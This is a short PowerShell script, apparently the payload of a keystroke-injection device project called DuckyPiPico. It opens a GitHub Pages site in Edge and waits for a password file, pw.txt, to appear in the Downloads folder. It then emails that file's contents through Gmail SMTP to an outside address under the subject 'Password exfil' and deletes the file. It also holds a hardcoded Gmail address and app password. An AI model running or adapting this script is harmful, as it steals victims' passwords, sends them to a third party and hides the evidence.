# path to password file
$pathtodownloads = (New-Object -ComObject Shell.Application).NameSpace('shell:Downloads').Self.Path
$pathtofile = "$pathtodownloads\pw.txt"

# set config for email
$From = "injectionkeystroke@gmail.com"
$To = "maklo119@hhu.de"
$Subject = "Password exfil from $($env:computername)"
$Password = "wxmukckmhuetdmvt" | ConvertTo-SecureString -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $From, $Password

# open page in msedge
Start-Process msedge "https://marwinkloefer.github.io/DuckyPiPico/"

# wait for file to exist
while (-not (Test-Path $pathtofile)) {
    Start-Sleep -Seconds 1
}

# Dateiinhalt auslesen
$content = Get-Content -Path $pathtofile
# Send mail
Send-MailMessage -From $From -To $To -Subject $Subject -Body $content -SmtpServer "smtp.gmail.com" -port 587 -UseSsl -Credential $Credential

# Delete file
Remove-Item -Path $pathtofile -Force
exit
